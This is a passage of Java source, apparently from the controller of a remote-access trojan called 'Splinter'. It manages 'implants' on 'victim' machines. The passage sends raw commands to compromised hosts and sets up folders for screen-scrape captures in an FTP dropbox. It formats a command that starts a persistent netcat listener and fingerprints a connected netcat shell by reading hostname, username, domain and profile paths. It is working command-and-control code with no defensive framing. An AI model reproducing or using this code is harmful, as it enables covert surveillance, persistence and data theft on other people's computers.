				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_RECORD_SCREEN))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_RECORD_SCREEN;
				}
				
				
				
			}catch(Exception e){Drivers.jop_Error("Invalid value entered from shortcut command. \n\nUnable to Continue " + " Code: " + e.getLocalizedMessage(), "Unable to Send Shortcut"); return false;}
			
			
			
			
			
			
			this.pwOut.println(cmdToSend);
			this.pwOut.flush();
			
			try	{	Driver.logReceivedLine(false, this.getId(), " " + this.myRandomIdentifier + " ", " SPLINTER - CONTROLER ", " " + myImplantName + " ", " " + Thread_ServerSocket.ControllerIP + " ", " " + this.myVictim_RHOST_IP + " ", cmdToSend);	} catch(Exception ee){}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("Thread ID: " + myThread_ID + " sendCommand_RAW", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}

  public File configureEnvironmentForScreenScrape(String FolderName)
  {
    try
    {
      if ((Driver.fleFTP_DropBoxDirectory == null) || (!Driver.fleFTP_DropBoxDirectory.exists()) || (!Driver.fleFTP_DropBoxDirectory.isDirectory()))
      {
        Driver.jop("FTP Dropbox Improperly Configured!!!");
        return null;
      }

      if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
        this.fleMySaveDirectory = new File(Driver.fleFTP_DropBoxDirectory.getCanonicalPath() + this.myVictim_RHOST_IP + "_" + FTP_ServerSocket.PORT);
      else {
        this.fleMySaveDirectory = new File(Driver.fleFTP_DropBoxDirectory.getCanonicalPath() + Driver.fileSeperator + this.myVictim_RHOST_IP + "_" + FTP_ServerSocket.PORT);
      }

      boolean directoryExists = true;
      if ((!this.fleMySaveDirectory.exists()) || (!this.fleMySaveDirectory.isDirectory()))
      {
        directoryExists = this.fleMySaveDirectory.mkdir();
      }

      if (!directoryExists)
      {
        Driver.sop("Could not create directory!!! in " + this.strMyClassName);
        return null;
      }

      if (Driver.fleFTP_DropBoxDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
        this.fleMyScreenScrapeDirectory = new File(this.fleMySaveDirectory.getCanonicalPath() + FolderName);
      else {
        this.fleMyScreenScrapeDirectory = new File(this.fleMySaveDirectory.getCanonicalPath() + Driver.fileSeperator + FolderName);
      }

      if ((!this.fleMyScreenScrapeDirectory.exists()) || (!this.fleMyScreenScrapeDirectory.isDirectory()))
      {
        directoryExists = this.fleMyScreenScrapeDirectory.mkdir();
      }

      return this.fleMyScreenScrapeDirectory;
    }
    catch (Exception e)
    {
      Driver.eop("configureEnvironmentForScreenScrape", this.strMyClassName, e, "", false);
    }

    return null;
  }

  public boolean closeThread()
  {
    try
    {
      this.continueRun = false;
      this.I_am_Disconnected_From_Implant = true;
      this.killThread = true;

      this.myDisconnectionTime = Drivers.getTimeStamp_Without_Date();
      if (this.myDisconnectionTime == null)
      {
        this.myDisconnectionTime = "";
      }

      try
      {
        for (int i = 0; i < this.alJtxtpne_PrivatePanes.size(); i++)
        {
          ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).appendStatusMessageString(false, "------------>>>>>>>> DISCONNECTED FROM CLIENT @" + this.myDisconnectionTime);
        }
      } catch (Exception localException) {
      }
      try {
        this.tmrReadLine.stop(); } catch (Exception localException1) {
      }
      if (this.i_am_Beacon_Agent)
      {
        updateBeaconConnectionTime(this.myReceivedConfirmationID_From_Implant);
      }

      Drivers.removeThread(this, getId());
    }
    catch (Exception localException2)
    {
    }

    return false;
  }

  public String reformatShortcut_ESTABLISH_PERSISTEN_LISTENER(String originalCommand, int port, String listenerBinaryFileName)
  {
    String strToReturn = "";
    try
    {
      strToReturn = "start ." + Driver.fileSeperator + listenerBinaryFileName + " " + "-L" + " " + port;
    }
    catch (Exception e)
    {
      Drivers.eop("reformatShortcut_ESTABLISH_PERSISTEN_LISTENER", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return strToReturn;
  }

  public boolean interrogateNewAgent_NETCAT_OLDER(BufferedReader brSocket)
  {
    try
    {
      String strThirdLine = brSocket.readLine();

      if ((strThirdLine != null) && (strThirdLine.trim().equals("")))
      {
        Drivers.sop("-->>> Almost there... Confidence level is 75% ...");

        sendCommand_RAW("");

        String strFourthLine = brSocket.readLine();

        if ((strFourthLine != null) && (strFourthLine.trim().endsWith(">")))
        {
          Drivers.sop("-->>>> OK. So as best as I can tell, this is a netcat agent. I will label this implant netcat -->>>> Confidence level for netcat: 100% -->>>> I am sending commands to better interrogate the system now...");

          this.myIMPLANT_ID = 1;
          try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }

          this.i_am_NETCAT_Agent = true;

          this.myImplantInitialLaunchDirectory = strFourthLine;

          brSocket.readLine();
        }

      }

      sendCommand_RAW("hostname");
      brSocket.readLine();
      this.myHostName = brSocket.readLine();

      sendCommand_RAW("echo %username%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserName = brSocket.readLine();

      sendCommand_RAW("echo %homedrive%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myHomeDrive = brSocket.readLine();
      if ((this.myHomeDrive != null) && (this.myHomeDrive.trim().equals("%homedrive%")))
      {
        this.myHomeDrive = " - ";
      }

      sendCommand_RAW("echo %NUMBER_OF_PROCESSORS%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myNumberOfProcessors = brSocket.readLine();

      sendCommand_RAW("echo %OS%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myOS_Type = brSocket.readLine();

      sendCommand_RAW("echo %PROCESSOR_ARCHITECTURE%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myProcessorArchitecture = brSocket.readLine();

      sendCommand_RAW("echo %SystemRoot%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.mySystemRoot = brSocket.readLine();

      sendCommand_RAW("echo %USERDOMAIN%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserDomain = brSocket.readLine();

      sendCommand_RAW("echo %USERPROFILE%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserProfile = brSocket.readLine();

      sendCommand_RAW("echo %TEMP%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myTempPath = brSocket.readLine();

      Drivers.sop("PUNT!!!  Nope. I am stopping the interrogation of this system early.  I did not expect to encounter an agent running an older version of cmd.exe and it is unclear if I can interact with wmic on the target.  If needed, contact Splinter and ask for the methods to continue the interrogation.");

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("interrogateNewAgent_NETCAT_OLDER", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}